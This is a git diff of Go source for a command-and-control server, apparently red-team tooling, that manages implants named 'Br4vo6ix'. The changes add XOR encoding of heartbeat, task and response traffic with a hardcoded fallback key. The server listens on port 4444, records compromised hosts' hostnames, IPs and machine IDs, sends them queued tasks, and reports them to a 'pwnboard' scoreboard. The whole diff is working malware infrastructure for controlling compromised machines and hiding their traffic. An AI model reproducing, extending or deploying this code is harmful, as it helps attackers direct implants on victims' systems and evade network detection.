@@ -18,7 +18,6 @@ import (
 	"github.com/BradHacker/chungus/graph"
 	"github.com/BradHacker/chungus/pb"
 	"github.com/BradHacker/chungus/pwnboard"
-	"github.com/BradHacker/chungus/utils"
 
 	"github.com/99designs/gqlgen/graphql/handler"
 	"github.com/99designs/gqlgen/graphql/playground"
@@ -29,7 +28,7 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
-var IMPLANT_NAME = "chungus"
+var IMPLANT_NAME = "Br4vo6ix"
 
 func ListenOnPort(port int) (net.Listener, error) {
 	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
@@ -64,7 +63,7 @@ func ListenOnPort(port int) (net.Listener, error) {
 // 	}, nil
 // }
 
-func SendNoOp(c net.Conn) error {
+func SendNoOp(c net.Conn, XOR_KEY []byte) error {
 	t := pb.Task{
 		Uuid:          "",
 		HeartbeatUuid: "",
@@ -77,14 +76,23 @@ func SendNoOp(c net.Conn) error {
 		return fmt.Errorf("error marshalling task: %v", err)
 	}
 
-	_, err = c.Write(taskBytes)
+	encNoopBytes := EncodeDecodeData(taskBytes, []byte(XOR_KEY))
+	_, err = c.Write(encNoopBytes)
 	if err != nil {
 		return fmt.Errorf("error sending NOOP task: %v", err)
 	}
 	return nil
 }
 
-func HandleConnection(client *ent.Client, c net.Conn) {
+func EncodeDecodeData(data []byte, key []byte) []byte {
+	output := make([]byte, len(data))
+	for i, inputByte := range data {
+		output[i] = inputByte ^ key[i%len(key)]
+	}
+	return output
+}
+
+func HandleConnection(client *ent.Client, c net.Conn, XOR_KEY []byte) {
 	defer c.Close()
 
 	ip_parts := strings.Split(c.RemoteAddr().String(), ":")
@@ -92,8 +100,6 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 	if err != nil {
 		port = 0
 	}
-
-	go pwnboard.SendUpdate(ip_parts[0], IMPLANT_NAME)
 
 	ctx := context.Background()
 	defer ctx.Done()
@@ -108,19 +114,22 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 		fmt.Printf("error trimming buffer: %v\n", err)
 		return
 	}
+	decHbBytes := EncodeDecodeData(hbBuffer[:hbNumBytes], []byte(XOR_KEY))
 	hb := pb.Heartbeat{}
-	err = proto.Unmarshal(hbBuffer[:hbNumBytes], &hb)
+	err = proto.Unmarshal(decHbBytes, &hb)
 	if err != nil {
 		fmt.Printf("error while unmarshalling: %v\n%v\n", err, hbBuffer)
 		return
 	}
 
+	go pwnboard.SendUpdate(hb.Ip, IMPLANT_NAME)
+
 	imp, err := client.Implant.Query().Where(implant.MachineIDEQ(hb.MachineId)).Only(ctx)
 	if ent.IsNotFound(err) {
-		imp, err = client.Implant.Create().SetUUID(uuid.NewString()).SetMachineID(hb.MachineId).Save(ctx)
+		imp, err = client.Implant.Create().SetUUID(uuid.NewString()).SetHostname(hb.Hostname).SetIP(hb.Ip).SetMachineID(hb.MachineId).Save(ctx)
 		if err != nil {
 			fmt.Printf("error while creating implant in db: %v", err)
-			err = SendNoOp(c)
+			err = SendNoOp(c, XOR_KEY)
 			if err != nil {
 				fmt.Printf("error sending NOOP")
 			}
@@ -128,7 +137,7 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 		}
 	} else if err != nil {
 		fmt.Printf("error while querying implant in db: %v", err)
-		err = SendNoOp(c)
+		err = SendNoOp(c, XOR_KEY)
 		if err != nil {
 			fmt.Printf("error sending NOOP")
 		}
@@ -140,10 +149,10 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 		fmt.Printf("error updating last seen at: %v\n", err)
 	}
 
-	heartbeat, err := client.Heartbeat.Create().SetUUID(uuid.NewString()).SetImplant(imp).SetPid(int(hb.Pid)).SetIP(ip_parts[0]).SetPort(port).Save(ctx)
+	heartbeat, err := client.Heartbeat.Create().SetUUID(uuid.NewString()).SetImplant(imp).SetHostname(hb.Hostname).SetPid(int(hb.Pid)).SetIP(hb.Ip).SetPort(port).Save(ctx)
 	if err != nil {
 		fmt.Printf("error creating heartbeat in db: %v", err)
-		err = SendNoOp(c)
+		err = SendNoOp(c, XOR_KEY)
 		time.Sleep(30 * time.Second)
 		if err != nil {
 			fmt.Printf("error sending NOOP")
@@ -154,7 +163,7 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 	nextTask, err := imp.QueryTasks().Where(task.HasRunEQ(false)).Order(ent.Asc(task.FieldCreatedAt)).First(ctx)
 	if err != nil {
 		if ent.IsNotFound(err) {
-			err = SendNoOp(c)
+			err = SendNoOp(c, XOR_KEY)
 			if err != nil {
 				fmt.Printf("error sending NOOP")
 			}
@@ -180,17 +189,18 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 	taskBytes, err := proto.Marshal(&t)
 	if err != nil {
 		fmt.Printf("error marshalling protobuf: %v\n", err)
-		err = SendNoOp(c)
+		err = SendNoOp(c, XOR_KEY)
 		if err != nil {
 			fmt.Printf("error sending NOOP")
 		}
 		return
 	}
 
-	_, err = c.Write(taskBytes)
+	encTaskBytes := EncodeDecodeData(taskBytes, []byte(XOR_KEY))
+	_, err = c.Write(encTaskBytes)
 	if err != nil {
 		fmt.Printf("error sending task to implant: %v", err)
-		err = SendNoOp(c)
+		err = SendNoOp(c, XOR_KEY)
 		if err != nil {
 			fmt.Printf("error sending NOOP")
 		}
@@ -203,13 +213,9 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 		fmt.Printf("error reading from connection: %v", err)
 		return
 	}
-	resBuffer, err := utils.TrimBuffer(readResponseBuffer)
-	if err != nil {
-		fmt.Printf("error trimming buffer: %v", err)
-		return
-	}
+	decResBuffer := EncodeDecodeData(readResponseBuffer[:numResBytes], []byte(XOR_KEY))
 	res := pb.TaskResponse{}
-	err = proto.Unmarshal(resBuffer[:numResBytes], &res)
+	err = proto.Unmarshal(decResBuffer, &res)
 	if err != nil {
 		fmt.Printf("error while unmarshalling: %v", err)
 		return
@@ -223,7 +229,7 @@ func HandleConnection(client *ent.Client, c net.Conn) {
 	}
 }
 
-func StartListening(client *ent.Client, port int) {
+func StartListening(client *ent.Client, port int, XOR_KEY []byte) {
 	listener, err := ListenOnPort(port)
 	if err != nil {
 		fmt.Printf("couldn't listen on port: %v\n", err)
@@ -237,7 +243,7 @@ func StartListening(client *ent.Client, port int) {
 			return
 		}
 
-		go HandleConnection(client, con)
+		go HandleConnection(client, con, XOR_KEY)
 	}
 }
 
@@ -319,10 +325,11 @@ func playgroundHandler() gin.HandlerFunc {
 }
 
 func main() {
-	client, err := ent.Open("sqlite3", "file:test.sqlite?_loc=auto&cache=shared&_fk=1")
-	if err != nil {
-		log.Fatalf("failed opening connection to sqlite: %v", err)
-	}
+	client := ent.SQLLiteOpen("file:test.sqlite?_loc=auto&cache=shared&_fk=1")
+	//client, err := ent.Open("sqlite3", "file:test.sqlite?_loc=auto&cache=shared&_fk=1")
+	//if err != nil {
+	//	log.Fatalf("failed opening connection to sqlite: %v", err)
+	//}
 	fmt.Println("ENT Databasse Initialized...")
 
 	defer client.Close()
@@ -333,7 +340,12 @@ func main() {
 		log.Fatalf("failed creating schema resources: %v", err)
 	}
 
-	go StartListening(client, 4444)
+	XOR_KEY := os.Getenv("BR4VO_KEY")
+	if XOR_KEY == "" {
+		XOR_KEY = "abcd1234"
+	}
+
+	go StartListening(client, 4444, []byte(XOR_KEY))
 
 	port := os.Getenv("PORT")
 	if port == "" {
